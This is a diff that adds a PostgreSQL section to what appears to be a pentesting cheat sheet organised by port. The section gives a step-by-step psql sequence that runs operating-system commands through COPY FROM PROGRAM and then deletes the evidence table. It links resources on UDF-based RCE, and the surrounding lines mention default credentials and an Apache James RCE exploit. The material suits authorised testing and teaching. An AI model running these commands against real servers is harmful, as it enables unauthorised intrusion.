@@ -466,6 +466,25 @@ Default credentials are `root` / `root`.
 
 `Version 2.3.2` is vulnerable to [RCE - SEE HERE](https://packetstormsecurity.com/files/164313/Apache-James-Server-2.3.2-Remote-Command-Execution.html).
 
+### PostgreSQL [5432, 5433 TCP]
+
+Authenticated arbitrary command execution
+* PostgreSQL ver 9.3 > LATEST
+```sql
+$ psql -h [target] -p [port] -U postgres
+Password for user postgres:
+
+postgres=# \c postgres                              # connect to postgres DB
+postgres=# CREATE TABLE cmd_exec(cmd_output text);  # create table to hold cmd output
+postgres=# COPY cmd_exec FROM PROGRAM ‘{command}’;  # exec command
+postgres=# SELECT * FROM cmd_exec;                  # view results
+postgres=# DROP TABLE IF EXISTS cmd_exec;           # cleanup
+```
+
+PostgreSQL RCE - UDF and other methods
+* https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions
+
+
 ### VNC [5800, 5900 TCP]
 
 Connect to VNC
